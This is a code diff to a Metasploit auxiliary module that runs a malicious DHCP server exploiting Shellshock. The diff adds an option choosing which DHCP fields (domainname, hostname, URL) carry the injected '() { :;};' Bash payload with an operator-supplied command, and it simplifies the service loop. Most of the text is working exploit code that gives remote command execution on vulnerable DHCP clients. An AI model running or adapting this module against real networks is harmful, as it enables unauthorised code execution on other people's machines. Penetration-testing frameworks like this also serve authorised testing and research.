@@ -23,7 +23,7 @@ class MetasploitModule < Msf::Auxiliary
       ],
       'License' => MSF_LICENSE,
       'Actions' => [
-        [ 'Service', 'Description' => 'Run malicious DHCP server' ]
+        [ 'Service', { 'Description' => 'Run Shellshock DHCP server' } ]
       ],
       'PassiveActions' => [
         'Service'
@@ -38,7 +38,7 @@ class MetasploitModule < Msf::Auxiliary
         [ 'URL', 'https://seclists.org/oss-sec/2014/q3/649' ],
         [ 'URL', 'https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/' ]
       ],
-      'DisclosureDate' => 'Sep 24 2014',
+      'DisclosureDate' => '2014-09-24',
       'Notes' => {
         'AKA' => ['Shellshock']
       }
@@ -50,31 +50,57 @@ class MetasploitModule < Msf::Auxiliary
       ]
     )
 
+    register_advanced_options(
+      [
+        OptString.new(
+          'SHELLSHOCK_DHCP_VARS',
+          [
+            true,
+            'DHCP variables to poison (comma-separated: domainname, hostname, url)',
+            'domainname,hostname,url'
+          ]
+        )
+      ]
+    )
+
     deregister_options('DOMAINNAME', 'HOSTNAME', 'URL')
   end
 
-  def run
-    value = "() { :; }; PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin #{datastore['CMD']}"
+  def dhcp_vars
+    vars = datastore['SHELLSHOCK_DHCP_VARS'].to_s.split(',').map(&:strip)
+    invalid = vars - %w[domainname hostname url]
+    fail_with(Failure::BadConfig, "Invalid SHELLSHOCK_DHCP_VARS: #{invalid.join(', ')}") unless invalid.empty?
+    vars
+  end
 
-    hash = datastore.copy
-    hash['DOMAINNAME'] = value
-    hash['HOSTNAME'] = value
-    hash['URL'] = value
+  def build_dhcp_vars(value)
+    vars = {}
 
-    # This loop is required because the current DHCP Server exits after the
-    # first interaction.
-    loop do
-      begin
-        start_service(hash)
-
-        while @dhcp.thread.alive?
-          select(nil, nil, nil, 2)
-        end
-      rescue Interrupt
-        break
-      ensure
-        stop_service
+    dhcp_vars.each do |var|
+      vprint_status("Injecting into: DHCP #{var}")
+      case var
+      when 'domainname'
+        vars['DOMAINNAME'] = value
+      when 'hostname'
+        vars['HOSTNAME'] = value
+      when 'url'
+        vars['URL'] = value
       end
     end
+
+    vars
+  end
+
+  def run
+    value = "() { :;};PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin #{datastore['CMD']}"
+
+    start_service(
+      datastore.merge(build_dhcp_vars(value))
+    )
+
+    # Wait for finish
+    sleep 2 while @dhcp&.thread&.alive?
+
+    stop_service
   end
 end
